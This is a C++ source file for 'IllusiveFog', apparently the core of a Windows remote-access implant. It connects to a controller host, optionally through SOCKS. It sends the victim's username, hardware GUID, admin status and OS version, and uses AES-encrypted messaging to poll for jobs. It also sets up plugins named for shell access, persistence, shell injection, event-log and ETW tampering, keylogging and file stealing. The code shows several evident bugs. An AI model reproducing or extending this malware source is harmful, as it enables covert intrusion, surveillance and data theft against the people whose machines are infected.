
#include "IllusiveFog.h"

IllusiveFog::IllusiveFog::IllusiveFog(char* sockip, int sockport, char* hostip, int hostport, int sockswait, char* socks_user_auth, char* socks_pass_auth, BOOL auth_enabled) {
	this->IllusiveFog_report_param = MemoryManager::IllusiveFog_alloc_reporter();
	this->IllusiveFog_report_param->dest_ip = hostip;
	this->IllusiveFog_report_param->destport = hostport;
	this->IllusiveFog_report_param->sockstimer = sockswait;
	reporter::reporter_initalize(this->IllusiveFog_report_param);
#ifdef SOCKS
	this->IllusiveFog_report_param->socks_ip = sockip;
	this->IllusiveFog_report_param->sockport = sockport //check this
		if ((this->socket_result != socketlib::set_sockaddr(sockip, sockport)) != sock_s_ok) {
#ifdef _DEBUG
			this->IllusiveFog_debug_socket(this->socket_result);
#endif
			ExitProcess(this->socket_result);
		}
#endif
	if ((this->socket_result = socketlib::set_destaddr(hostip, hostport)) != sock_s_ok) {
#ifdef _DEBUG
		this->IllusiveFog_debug_socket(this->socket_result);
#endif
		ExitProcess(this->socket_result);
	}
#ifdef SOCKS

	if (auth_enabled) {
		socketlib::set_socksauth(socks_user_auth, socks_pass_auth);
	}
#endif
	socketlib::socks_timer = sockswait;
	if ((this->socket_result = socketlib::set_socks_timer()) != sock_s_ok) {
#ifdef _DEBUG
		this->IllusiveFog_debug_socket(this->socket_result); //look out for timer
#endif
	}
#ifdef SOCKS
	this->IllusiveFog_agent_result = this->form_address(sockip, sockport, hostip, hostport);
#else
	this->IllusiveFog_agent_result = this->form_address(NULL, 0, hostip, hostport);
#endif
	if (this->IllusiveFog_agent_result != IllusiveFog_s_ok) {
#ifdef _DEBUG
		this->IllusiveFog_debug(this->IllusiveFog_agent_result);
#endif
		ExitProcess(this->IllusiveFog_agent_result);
	}
	this->socket_result = socketlib::socket_connect();
	while (this->socket_result != sock_s_ok) {
		socketlib::set_socks_timer();
		socketlib::socks_wait();
		this->socket_result = socketlib::socket_connect();
		shutdown(socketlib::socket_conn, SD_SEND);
		closesocket(socketlib::socket_conn);
	}


}

IllusiveFog::IllusiveFog::IllusiveFog_result IllusiveFog::IllusiveFog::form_address(char* sockip, int sockport, char* hostip, int hostport) {
#ifdef SOCKS5
	if (*sockip == NULL)
		return IllusiveFog_no_sockip;
	if (sockport == 0)
		return IllusiveFog_no_sockport;
#endif
	if (*hostip == NULL)
		return IllusiveFog_no_hostip;
	if (hostport == 0)
		return IllusiveFog_no_hostport;
	char* temp = (char*)MemoryManager::AllocateTemporary(20);
	ZeroMemory(this->dest_address, dest_address_size);
	ZeroMemory(temp, 20);
#ifdef SOCKS5
	ZeroMemory(this->sock_address, sock_address_size);
	strcpy(this->sock_address, sockip);
	_itoa(sockport, temp, 10);
	strcat(this->sock_address, ":");
	strcat(this->sock_address, temp);
	ZeroMemory(temp, 20);

#endif
	strcpy(this->dest_address, hostip);

	_itoa(hostport, temp, 10);
	strcat(this->dest_address, ":");
	strcat(this->dest_address, temp);
	this->FreeTemporary(temp);
	return IllusiveFog_s_ok;

}
Preporter_param IllusiveFog::MemoryManager::IllusiveFog_alloc_reporter() {
	return (Preporter_param)malloc(sizeof(reporter_param)); //add count

}
PAgent_Info IllusiveFog::IllusiveFog::GetAgentInfo() {
	PAgent_Info agent_info = MemoryManager::AllocateAgentInfo();
	__try {
		HKEY phkey_version = NULL;
		RegOpenKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion", &phkey_version);
		DWORD max_data = 200;
		DWORD temp_type = KEY_READ | KEY_QUERY_VALUE;
		ZeroMemory(agent_info->windows_version, 200);
		RegQueryValueExA(phkey_version, "ProductName", NULL, &temp_type, (BYTE*)agent_info->windows_version, &max_data);
		RegCloseKey(phkey_version);
		ZeroMemory(agent_info, sizeof(agent_info));
		HW_PROFILE_INFOA hw_profile;
		GetCurrentHwProfileA(&hw_profile);
		bool priv_level = IsUserAnAdmin(); //check privilege level
		if (priv_level == false) { agent_info->priv_level = 0; }
		else { agent_info->priv_level = 1; }
		strcpy(agent_info->guid, hw_profile.szHwProfileGuid);
		//strcpy(agent_info->major_minor_version, "1"); //for now
		DWORD maxlen = 50;
		GetUserNameA((char*)&agent_info->username, &maxlen);

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		this->IllusiveFog_agent_result = IllusiveFog_get_agent_info_failed;
#ifdef _DEBUG
		this->IllusiveFog_debug(IllusiveFog_agent_result);
#endif
		ExitProcess(IllusiveFog_get_agent_info_failed);
	}
	return agent_info;
}

IllusiveFog::IllusiveFog::IllusiveFog_result IllusiveFog::IllusiveFog::send_IllusiveFog_agent_info(PAgent_Info agent_info, char* intial_param1, char* initial_param2, char* intial_param3, char* intial_param4, char* initial_param5, char* intial_request_location, char* buffer, char* output_buffer) {
	this->IllusiveFog_agent_result = this->form_IllusiveFog_agent_post_request(agent_info, intial_param1, initial_param2, intial_param3, intial_param4, initial_param5, buffer);
	if (this->IllusiveFog_agent_result != IllusiveFog_s_ok) {
#ifdef _DEBUG
		this->IllusiveFog_debug(this->IllusiveFog_agent_result);
#endif
		ExitProcess(this->IllusiveFog_agent_result);
	}

	char* temp = (char*)MemoryManager::AllocateTemporary(100);
	_itoa(strlen(buffer), temp, 10);
	ZeroMemory(output_buffer, 321);
	char* post_buffer = (char*)MemoryManager::AllocateTemporary(strlen(dest_address) + post_request_extra_space + strlen(buffer));
	this->socket_result = socketlib::send_post_request(intial_request_location, temp, buffer, dest_address, post_buffer, output_buffer, 320);
	if (this->socket_result != sock_s_ok) {
#ifdef _DEBUG
		this->IllusiveFog_debug_socket(this->socket_result);
#endif	
		this->IllusiveFog_agent_result = IllusiveFog_error_failed_send_agent_info;
		ExitProcess(this->IllusiveFog_agent_result);
	}
	if (&output_buffer[10] == NULL) {
		socketlib::send_post_request(intial_request_location, temp, buffer, dest_address, post_buffer, output_buffer, 320); //fix this
	}
	this->memory_result = MemoryManager::FreeTemporary(post_buffer);
	if (memory_result == invalid_temp_memory_freed) {
#ifdef _DEBUG
		this->IllusiveFog_debug_memory_manager(memory_result);
#endif
	}
	//check socket_result

	this->memory_result = FreeTemporary(temp); //add error checking later
	if (memory_result == invalid_temp_memory_freed) {
#ifdef _DEBUG
		this->IllusiveFog_debug_memory_manager(this->memory_result);
#endif
	}
	return IllusiveFog_s_ok;

}

IllusiveFog::IllusiveFog::IllusiveFog_result IllusiveFog::IllusiveFog::form_IllusiveFog_agent_post_request(PAgent_Info agent_info, char* intial_param1, char* initial_param2, char* intial_param3, char* intial_param4, char* initial_param5, char* buffer) {
	__try {
		strcpy(buffer, intial_param1);
		strcat(buffer, agent_info->username);
		strcat(buffer, initial_param2);
		strcat(buffer, agent_info->guid);
		strcat(buffer, intial_param3);
		if (agent_info->priv_level == FALSE) { strcat(buffer, "0"); }
		else { strcat(buffer, "1"); } //change this to atoid(1) and then strcat
		strcat(buffer, intial_param4);
		strcat(buffer, agent_info->windows_version); //change this
		strcat(buffer, initial_param5);
		BOOL barch;
		IsWow64Process(GetCurrentProcess(), &barch);
		if (barch == TRUE) {
			strcat(buffer, "0");
		}
		else {
			strcat(buffer, "1");
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
#ifdef _DEBUG
		this->IllusiveFog_agent_result = IllusiveFog_post_request_heap_corrupted;

#endif
		ExitProcess(IllusiveFog_post_request_heap_corrupted);
	}
	return IllusiveFog_s_ok;
}



LPVOID IllusiveFog::MemoryManager::AllocateTemporary(DWORD size) {
	this->TempoararyMemoryCount++;
	return malloc(size);
}
Preporter_com_param IllusiveFog::MemoryManager::allocate_reporter_com_param() {
	this->reporter_com_param_count++;
	return (Preporter_com_param)malloc(sizeof(report_com_param));
}
IllusiveFog::IllusiveFog::IllusiveFog_result IllusiveFog::IllusiveFog::IllusiveFog_set_reporter_param(char* param1, char* param2, char* param3, char* param4) {
	//add error checks try block 
	this->report_communication_parameter = MemoryManager::allocate_reporter_com_param();
	ZeroMemory(this->report_communication_parameter->param1, reporter_param_size);
	ZeroMemory(this->report_communication_parameter->param2, reporter_param_size);
	ZeroMemory(this->report_communication_parameter->param3, reporter_param_size);
	ZeroMemory(this->report_communication_parameter->param4, reporter_param_size);
	strncpy(this->report_communication_parameter->param1, param1, strlen(param1));
	strncpy(this->report_communication_parameter->param2, param2, strlen(param2));
	strncpy(this->report_communication_parameter->param3, param3, strlen(param3));
	strncpy(this->report_communication_parameter->param4, param4, strlen(param4));
	return IllusiveFog_s_ok;

}
IllusiveFog::MemoryManager::memory_manager_result IllusiveFog::MemoryManager::FreeTemporary(LPVOID memory) {
	__try {
		free(memory);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		return invalid_temp_memory_freed;
	}
	this->TempoararyMemoryCount--;
	return memory_s_ok;
}
PAgent_Info IllusiveFog::MemoryManager::AllocateAgentInfo() {
	PAgent_Info agent_info = (PAgent_Info)malloc(sizeof(Agent_info));
	this->AgentInfoCount++;
	return agent_info;
}
PAgentSession_info IllusiveFog::IllusiveFog::SetAgentSession_info(char* AgentSession_buffer) {
	char* temp_ptr = strstr(&AgentSession_buffer[10], "\r\n\r\n"); //add NULL checks
	if (temp_ptr == NULL)
		return NULL;//no http header received
	temp_ptr += 4;
	PAgentSession_info agent_Session_info = MemoryManager::AllocateAgent_SessionInfo();
	__try {
		char* first_break = strstr(temp_ptr, this->break_ptr); //add NULL checks
		if (first_break == NULL)
			return NULL;
		this->dwtemp = strlen(temp_ptr) - strlen(first_break);
		ZeroMemory(agent_Session_info, sizeof(AgentSession_info));
		strncpy(agent_Session_info->ClientID, temp_ptr, this->dwtemp - 1); // -2 for whitespace and a break;
		char* second_break = strstr(&temp_ptr[this->dwtemp + 2], this->break_ptr);
		if (second_break == NULL)
			return NULL;
		this->dwtemp = strlen(temp_ptr) - strlen(second_break) - strlen(agent_Session_info->ClientID);
		char* base_temp3 = (char*)MemoryManager::AllocateTemporary(this->dwtemp);
		ZeroMemory(base_temp3, this->dwtemp);
		strncpy(base_temp3, &first_break[2], this->dwtemp - 4);
		DWORD sztemp = 1;
		utils::utils_convert_from_base64(base_temp3, agent_Session_info->CommunicationKey, sztemp);
		MemoryManager::FreeTemporary(base_temp3);
		char* third_break = strstr(&second_break[2], this->break_ptr);
		if (third_break == NULL)
			return NULL;
		this->dwtemp = strlen(temp_ptr);
		this->dwtemp -= strlen(agent_Session_info->CommunicationKey);
		this->dwtemp -= strlen(agent_Session_info->ClientID);
		this->dwtemp -= strlen(third_break);
		char* base_temp1 = (char*)MemoryManager::AllocateTemporary(this->dwtemp * sizeof(char));
		char* base_temp2 = (char*)MemoryManager::AllocateTemporary(this->dwtemp * sizeof(char));
		ZeroMemory(base_temp1, this->dwtemp * sizeof(char));
		ZeroMemory(base_temp2, this->dwtemp * sizeof(char));
		strncpy(base_temp1, &second_break[2], this->dwtemp - 6);
		DWORD ddwtemp = 1;
		utils::utils_convert_from_base64(base_temp1, agent_Session_info->Plugin_key, ddwtemp);
		strncpy(base_temp2, &third_break[2], this->dwtemp - 2);
		ddwtemp = 1;
		utils::utils_convert_from_base64(base_temp2, agent_Session_info->pellet_key, ddwtemp);
		ZeroMemory(base_temp1, this->dwtemp * sizeof(char));
		ZeroMemory(base_temp2, this->dwtemp * sizeof(char));
		MemoryManager::FreeTemporary(base_temp1);
		MemoryManager::FreeTemporary(base_temp2);
		ddwtemp = 0;
		first_break = NULL;
		second_break = NULL;
		third_break = NULL;
		temp_ptr = NULL;
		base_temp1 = NULL;
		base_temp2 = NULL;
		base_temp3 = NULL;
		delete temp_ptr;
		delete first_break;
		delete second_break;
		delete third_break;
		delete base_temp1;
		delete base_temp2;
		delete base_temp3;

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
#ifdef _DEBUG
		this->IllusiveFog_agent_result = set_agent_session_info_error;
		this->IllusiveFog_debug(this->IllusiveFog_agent_result);
#endif
		ExitProcess(set_agent_session_info_error);
		return NULL;
	}

	return agent_Session_info;

}
PAgentSession_info IllusiveFog::MemoryManager::AllocateAgent_SessionInfo() {
	PAgentSession_info AgentSession = (PAgentSession_info)malloc(sizeof(AgentSession_info));
	this->AgentSessioninfoCount++;
	return AgentSession;
}
IllusiveFog::IllusiveFog::IllusiveFog_result IllusiveFog::IllusiveFog::form_plugins(char* ShellPlugin, char* PersistPlugin, char* SelfSocks, char* InjShell, char* loadPlugin, char* EVTXPlugin, char* ETWPlugin, char* VerboseReconPlugin, char* VerboseCounter, char* CleanupPlugin, char* KeyLogPlugin, char* FileStealerPlugin) {
	Plugin::plugin_path = MemoryManager::AllocatePluginPath();
	ZeroMemory(Plugin::plugin_path, sizeof(PluginPaths));
	this->IllusiveFog_plugin_result = Plugin::set_plugin_paths(ShellPlugin, PersistPlugin, SelfSocks, InjShell, loadPlugin, EVTXPlugin, ETWPlugin, CleanupPlugin, VerboseReconPlugin, VerboseCounter, KeyLogPlugin, FileStealerPlugin);
	if (this->IllusiveFog_plugin_result != plugin_s_ok) {
#ifdef _DEBUG
		this->IllusiveFog_plugin_debug(this->IllusiveFog_plugin_result);
		ExitProcess(this->IllusiveFog_plugin_result);
#endif
	}
	return IllusiveFog_s_ok;
}
LPVOID IllusiveFog::MemoryManager::AllocateAgentSession() {
	this->AgentSession++;
	LPVOID agent = malloc(sizeof(struct_AgentSession));
	return agent;
}
IllusiveFog::IllusiveFog::IllusiveFog_result IllusiveFog::IllusiveFog::form_agent_session(PAgentSession_info agent_session_info, PAgent_Info agent_info, char* GetRequest, char* PostRequest, char* PluginPath, char* AgentErrorCodePath) {
	__try {
		//this->IllusiveFog_agent_session = (PAgentSession)MemoryManager::AllocateAgentSession(); //add try and exception block incase heap gets corrupted
		this->IllusiveFog_agent_session = (PAgentSession)malloc(sizeof(struct_AgentSession));
		strcpy(this->IllusiveFog_agent_session->AgentID, agent_session_info->ClientID); //fix this null ptr corruption
		strcpy(this->IllusiveFog_agent_session->AgentPluginPath, this->IllusiveFog_agent_session->AgentID);
		strcat(this->IllusiveFog_agent_session->AgentPluginPath, PluginPath);
		strcpy(this->IllusiveFog_agent_session->AgentGetRequest, "/"); //do this with post request
		strcat(this->IllusiveFog_agent_session->AgentGetRequest, this->IllusiveFog_agent_session->AgentID);
		strcpy(this->IllusiveFog_agent_session->AgentPostRequest, this->IllusiveFog_agent_session->AgentID);
		strcpy(this->IllusiveFog_agent_session->AgentErrorCodePath, this->IllusiveFog_agent_session->AgentID);
		strcat(this->IllusiveFog_agent_session->AgentErrorCodePath, AgentErrorCodePath);
		strcat(this->IllusiveFog_agent_session->AgentGetRequest, GetRequest);
		strcat(this->IllusiveFog_agent_session->AgentPostRequest, PostRequest);
		strcpy(this->IllusiveFog_agent_session->Plugin_key, agent_session_info->Plugin_key);
		strcpy(this->IllusiveFog_agent_session->pellet_key, agent_session_info->pellet_key);
		strcpy(this->IllusiveFog_agent_session->CommunicationKey, agent_session_info->CommunicationKey);

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
#ifdef _DEBUG
		this->IllusiveFog_agent_result = form_agent_session_heap_corrupted;
		this->IllusiveFog_debug(IllusiveFog_agent_result);
#endif
		ExitProcess(form_agent_session_heap_corrupted);
	}

	return IllusiveFog_s_ok;

}
IllusiveFog::Plugin::plugin_result IllusiveFog::Plugin::set_plugin_paths(char* ShellPlugin, char* PersistPlugin, char* SelfSocksPlugin, char* InjShellCoPlugin, char* LoadPlugin, char* EVTXPlugin, char* ETWPlugin, char* cleanupPlugin, char* VerboseReconPath, char* VerboseCounter, char* KeyLogPlugin, char* FileStealerPlugin) {
	__try {
		strncpy(this->plugin_path->ShellPluginPath, ShellPlugin, strlen(ShellPlugin));
		strncpy(this->plugin_path->PersistPluginPath, PersistPlugin, strlen(PersistPlugin));
		strncpy(this->plugin_path->SelfSocksPluginPath, SelfSocksPlugin, strlen(SelfSocksPlugin));
		strncpy(this->plugin_path->InjShellCoPluginPath, InjShellCoPlugin, strlen(InjShellCoPlugin));
		strncpy(this->plugin_path->LoadPluginPath, LoadPlugin, strlen(LoadPlugin));
		strncpy(this->plugin_path->EVTXPluginPath, EVTXPlugin, strlen(EVTXPlugin));
		strncpy(this->plugin_path->ETWPluginPath, ETWPlugin, strlen(ETWPlugin));
		strncpy(this->plugin_path->VerbosePluginPath, VerboseReconPath, strlen(VerboseReconPath));
		strncpy(this->plugin_path->VerboseCounterPath, VerboseCounter, strlen(VerboseCounter));
		strncpy(this->plugin_path->CleanupPluginPath, cleanupPlugin, strlen(cleanupPlugin));
		strncpy(this->plugin_path->KeyLogPluginPath, KeyLogPlugin, strlen(KeyLogPlugin));
		strncpy(this->plugin_path->FileStealerPluginPath, FileStealerPlugin, strlen(FileStealerPlugin));

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		return plugin_setpath_heap_corrupted;
	}
	return plugin_s_ok;


}
PPluginPaths IllusiveFog::MemoryManager::AllocatePluginPath() {
	this->PluginPathCount++;
	return (PPluginPaths)malloc(sizeof(PluginPaths));
}
IllusiveFog::MemoryManager::memory_manager_result IllusiveFog::MemoryManager::FreeAgentInfo(PAgent_Info PAgentInfo) {
	__try {
		this->AgentInfoCount--; //check if it's already zero

		free(PAgentInfo);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		return invalid_heap_freed;
	}
}
IllusiveFog::MemoryManager::memory_manager_result IllusiveFog::MemoryManager::FreeAgentSessionInfo(PAgentSession_info PAgentSession) {
	__try {
		free(PAgentSession);
		this->AgentSessioninfoCount--; //check if it's already zero
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		return invalid_heap_freed;
	}
}
PIllusiveFog_reporter IllusiveFog::MemoryManager::allocate_IllusiveFog_reporter() {
	this->IllusiveFog_reporter_count++;
	return (PIllusiveFog_reporter)malloc(sizeof(IllusiveFog_reporter));
}
IllusiveFog::MemoryManager::memory_manager_result IllusiveFog::MemoryManager::free_IllusiveFog_reporter(LPVOID ptr) {
	free(ptr);

	this->IllusiveFog_reporter_count--;
	return memory_s_ok;
}

IllusiveFog::Plugin::plugin_result IllusiveFog::Plugin::set_plugin_hex_commands(char* hex_shell, char* hex_persist, char* hex_shellinj, char* hex_selfsocks, char* hex_load, char* hex_evtx, char* hex_etw, char* hex_verbose, char* hex_cleanup, char* hex_unload, char* hex_keylog, char* hex_filestealer) {
	__try {
		ZeroMemory(hex_commands_plugin[0], 100);
		ZeroMemory(hex_commands_plugin[1], 100);
		ZeroMemory(hex_commands_plugin[2], 100);
		ZeroMemory(hex_commands_plugin[3], 100);
		ZeroMemory(hex_commands_plugin[4], 100);
		ZeroMemory(hex_commands_plugin[5], 100);
		ZeroMemory(hex_commands_plugin[6], 100);
		ZeroMemory(hex_commands_plugin[7], 100);
		ZeroMemory(hex_commands_plugin[8], 100);
		ZeroMemory(hex_commands_plugin[9], 100);
		ZeroMemory(hex_commands_plugin[10], 100);
		ZeroMemory(hex_commands_plugin[11], 100);
		strcpy(hex_commands_plugin[0], hex_shell);
		strcpy(hex_commands_plugin[1], hex_persist);
		strcpy(hex_commands_plugin[2], hex_shellinj);
		strcpy(hex_commands_plugin[3], hex_selfsocks);
		strcpy(hex_commands_plugin[4], hex_load);
		strcpy(hex_commands_plugin[5], hex_evtx);
		strcpy(hex_commands_plugin[6], hex_etw);
		strcpy(hex_commands_plugin[7], hex_verbose);
		strcpy(hex_commands_plugin[8], hex_unload);
		strcpy(hex_commands_plugin[9], hex_cleanup);
		strcpy(hex_commands_plugin[10], hex_keylog);
		strcpy(hex_commands_plugin[11], hex_filestealer);
		return plugin_s_ok;

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		return plugin_error_set_plugin_hex_command;
	}
}
IllusiveFog::IllusiveFog::IllusiveFog_result IllusiveFog::IllusiveFog::IllusiveFog_form_hexcommands(char* hex_shell, char* hex_persist, char* hex_shellinj, char* hex_selfsocks, char* hex_load, char* hex_evtx, char* hex_etw, char* hex_verbose, char* hex_cleanup, char* hex_unload, char* hex_keylog, char* hex_filestealer) {
	this->IllusiveFog_plugin_result = Plugin::set_plugin_hex_commands(hex_shell, hex_persist, hex_shellinj, hex_selfsocks, hex_load, hex_evtx, hex_etw, hex_verbose, hex_cleanup, hex_unload, hex_keylog, hex_filestealer);
	if (this->IllusiveFog_plugin_result != plugin_s_ok) {
#ifdef _DEBUG
		this->IllusiveFog_plugin_debug(this->IllusiveFog_plugin_result);
#endif
		ExitProcess(IllusiveFog_error_form_hex_command_failed);
	}
	return IllusiveFog_s_ok;
}
IllusiveFog::IllusiveFog::IllusiveFog_result IllusiveFog::IllusiveFog::IllusiveFog_crash_report(char* crash_message, char* output) {
	char* crash_message_length = (char*)MemoryManager::AllocateTemporary(100);
	this->dwtemp = strlen(crash_message);
	_itoa(this->dwtemp, crash_message_length, 10);

	char* post_buffer = (char*)MemoryManager::AllocateTemporary(strlen(dest_address) + post_request_extra_space + strlen(crash_message));
	this->socket_result = socketlib::send_post_request(IllusiveFog_agent_session->AgentPostRequest, crash_message_length, crash_message, dest_address, post_buffer, output, 320);
	this->dwtemp = 0;
	this->memory_result = MemoryManager::FreeTemporary(crash_message_length);
	if (this->memory_result == memory_s_ok)
		this->memory_result = MemoryManager::FreeTemporary(post_buffer);
	post_buffer = NULL;
	crash_message_length = NULL;
	delete post_buffer;
	delete crash_message_length;
	return IllusiveFog_s_ok;
}
IllusiveFog::utils::utils_result IllusiveFog::utils::utils_aes_encrypt(unsigned char* aes_key, unsigned char* iv, unsigned char* buffer, DWORD buffer_size, DWORD max_buffer_size) {
	__try {
		ZeroMemory(&ctx.Iv, 16);
		ZeroMemory(&ctx.RoundKey, 176);

		//	this->utils_last_error = pkcs7_padding_pad_buffer(buffer, strlen((char*)buffer), max_buffer_size, 16);
		/*	if (utils_last_error == 0)
				return utils_aes_encryption_failed;*/

		AES_init_ctx_iv(&ctx, aes_key, iv);
		AES_CBC_encrypt_buffer(&ctx, buffer, buffer_size);
		this->utils_last_error = pkcs7_padding_pad_buffer(buffer, buffer_size, max_buffer_size, 16);
		ZeroMemory(&ctx.Iv, 16);
		ZeroMemory(&ctx.RoundKey, 176);
		return (utils_result)this->utils_last_error;

	}

	__except (EXCEPTION_EXECUTE_HANDLER) {
		return utils_aes_encryption_failed;
	}
}
IllusiveFog::utils::utils_result IllusiveFog::utils::utils_aes_encrypt_ms(unsigned char* aes_key, unsigned char* iv, unsigned char* buffer, DWORD prev, DWORD buffer_size, bool bcrypt) {
	ZeroMemory(&MS_AES, sizeof(MS_AES));
	MS_AES.blob_header.bType = PLAINTEXTKEYBLOB;
	MS_AES.blob_header.bVersion = CUR_BLOB_VERSION;
	MS_AES.blob_header.reserved = 0;
	MS_AES.blob_header.aiKeyAlg = CALG_AES_128;
	MS_AES.dwkeysize = 16;
	strcpy((char*)MS_AES.szkey, (char*)aes_key);
	//check difference char * and BYTE *
	this->utils_last_error = CryptAcquireContext(&this->h_prov, NULL, MS_ENH_RSA_AES_PROV_A, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
	this->utils_last_error = CryptImportKey(this->h_prov, (BYTE*)&MS_AES, sizeof(MS_AES), NULL, CRYPT_EXPORTABLE, &this->h_key);
	this->utils_last_error = CryptSetKeyParam(h_key, KP_IV, iv, 0);

	if (bcrypt) {
		this->utils_last_error = CryptEncrypt(this->h_key, NULL, TRUE, 0, NULL, &buffer_size, 0);
		CryptDestroyKey(this->h_key);
		CryptReleaseContext(this->h_prov, 0);

		return (utils_result)buffer_size;
	}
	this->utils_last_error = CryptEncrypt(this->h_key, NULL, TRUE, 0, buffer, &prev, buffer_size);
	CryptDestroyKey(this->h_key);
	CryptReleaseContext(this->h_prov, 0);

	return utils_s_ok;
}
IllusiveFog::utils::utils_result IllusiveFog::utils::utils_aes_decrypt_ms(unsigned char* aes_key, unsigned char* iv, unsigned char* buffer, DWORD buffer_size) {
	ZeroMemory(&MS_AES, sizeof(MS_AES));
	MS_AES.blob_header.bType = PLAINTEXTKEYBLOB;
	MS_AES.blob_header.bVersion = CUR_BLOB_VERSION;
	MS_AES.blob_header.reserved = 0;
	MS_AES.blob_header.aiKeyAlg = CALG_AES_128;
	MS_AES.dwkeysize = 16;
	strcpy((char*)MS_AES.szkey, (char*)aes_key);
	//check difference char * and BYTE *
	this->utils_last_error = CryptAcquireContext(&this->h_prov, NULL, MS_ENH_RSA_AES_PROV_A, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
	this->utils_last_error = CryptImportKey(this->h_prov, (BYTE*)&MS_AES, sizeof(MS_AES), NULL, CRYPT_EXPORTABLE, &this->h_key);
	this->utils_last_error = CryptSetKeyParam(h_key, KP_IV, iv, 0);
	this->utils_last_error = CryptDecrypt(this->h_key, NULL, TRUE, 0, buffer, &buffer_size);

	CryptDestroyKey(this->h_key);
	CryptReleaseContext(this->h_prov, 0);

	return (utils_result)buffer_size;


}


IllusiveFog::utils::utils_result IllusiveFog::utils::utils_aes_decrypt(unsigned char* aes_key, unsigned char* iv, unsigned char* buffer, int size) {
	__try {
		ZeroMemory(&ctx.Iv, 16);
		ZeroMemory(&ctx.RoundKey, 176);

		AES_init_ctx_iv(&ctx, aes_key, iv);
		AES_CBC_decrypt_buffer(&ctx, buffer, size);

		size = pkcs7_padding_data_length(buffer, size, 16);

		ZeroMemory(&ctx.Iv, 16);
		ZeroMemory(&ctx.RoundKey, 176);
		return (utils_result)size;
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		return utils_aes_decryption_failed;
	}

	return 	utils_s_ok;
}
IllusiveFog::utils::utils_result IllusiveFog::utils::utils_convert_from_base64(char* in, char* out, DWORD size) {
	if (size == 0) {
		if (CryptStringToBinaryA(
			in,
			strlen(in),
			CRYPT_STRING_BASE64,
			NULL,
			&size,
			NULL,
			NULL)) {
			return (utils_result)size;
		}
		else { return utils_base64_decode_failed; }

	}
	else {
		size = 0;
		CryptStringToBinaryA(
			in,
			strlen(in),
			CRYPT_STRING_BASE64,
			NULL,
			&size,
			NULL,
			NULL);

		CryptStringToBinary(in, strlen(in), CRYPT_STRING_BASE64, (BYTE*)out, &size, NULL, NULL);
	}
	return utils_s_ok;
}
IllusiveFog::utils::utils_result IllusiveFog::utils::utils_convert_to_base64(char* in, char* out, DWORD len) {
	__try {
		if (len == 0) {
			CryptBinaryToStringA(
				(BYTE*)in,
				strlen(in),
				CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
				NULL,
				&len);
			return (utils_result)len;
		}
		else {
			CryptBinaryToStringA((BYTE*)in, strlen(in), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, out, &len);
			return (utils_result)len;
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		return utils_hex_encode_failed;
	}

}
IllusiveFog::utils::utils_result IllusiveFog::utils::utils_convert_from_hex(char* in, char* out, DWORD len) {
	__try {

		if (len == 0) {
			CryptStringToBinaryA(
				in,
				strlen(in),
				CRYPT_STRING_HEX,
				NULL,
				&len,
				NULL,
				NULL);
			return (utils_result)len;
		}
		else {
			CryptStringToBinary(in, strlen(in), CRYPT_STRING_HEX, (BYTE*)out, &len, NULL, NULL);
			return (utils_result)len;
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		return utils_hex_decode_failed;
	}


}
IllusiveFog::utils::utils_result IllusiveFog::utils::utils_convert_to_hex(char* in, char* out, DWORD len, DWORD in_len) {
	__try {
		if (len == 0) {
			CryptBinaryToString(
				(BYTE*)in,
				in_len,
				CRYPT_STRING_HEXRAW | CRYPT_STRING_NOCRLF,
				NULL,
				&in_len);
			return (utils_result)in_len;
		}
		else {
			CryptBinaryToStringA((BYTE*)in, len, CRYPT_STRING_HEXRAW | CRYPT_STRING_NOCRLF, out, &len);
			return (utils_result)len;
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		return utils_hex_encode_failed;
	}

}
IllusiveFog::utils::utils_result IllusiveFog::utils::utils_url_encode(char* in, char* out, DWORD size) {
	__try {
		/*UrlEscapeA(raw_buffer, sznew_bufffer, &dwbufflen, URL_ESCAPE_UNSAFE);
*/
		if (size == 0) {
			UrlEscapeA(in, NULL, &size, URL_ESCAPE_AS_UTF8);
			return (utils_result)size;

		}
		else {
			UrlEscapeA(in, out, &size, URL_ESCAPE_AS_UTF8);
			return (utils_result)size;
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		return 	utils_url_encode_failed;
	}
}
//from here on use IllusiveFog_crash reporter

IllusiveFog::IllusiveFog::IllusiveFog_result IllusiveFog::IllusiveFog::IllusiveFog_receive_jobs(char* get_jobs_buffer, char* jobs_buffer, DWORD get_job_buffer_size) {
	__try {
		this->dwtemp = 0;
		/*	ZeroMemory(get_jobs_buffer, get_content_length_buffer_size + get_job_buffer_size);
			ZeroMemory(jobs_buffer, get_content_length_buffer_size);
		*/
		this->socket_result = socketlib::socket_get_content_length(IllusiveFog_agent_session->AgentGetRequest, this->dest_address, get_jobs_buffer, jobs_buffer, &this->dwtemp);
		if (this->dwtemp == 0 || this->socket_result == Error_get_content_length_failed) {
			return IllusiveFog_error_no_jobs;
		}

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
#ifdef _DEBUG
		this->IllusiveFog_debug(IllusiveFog_heap_corrupted_receive_jobs);
#endif
		//add option for debug here and last error and dwerror
		return IllusiveFog_heap_corrupted_receive_jobs;
	}

	return IllusiveFog_s_ok;

}
LPVOID IllusiveFog::MemoryManager::allocate_parameter(DWORD size) {
	this->parameter_count++;
	return malloc(size);
}
PJobs IllusiveFog::MemoryManager::AllocateJobs() {
	this->JobsCount++;
	return (PJobs)malloc(sizeof(jobs));
}
Pplugin_info IllusiveFog::MemoryManager::allocate_plugin_info() {
	this->plugin_info_count++;
	return (Pplugin_info)malloc(sizeof(plugin_info));
}

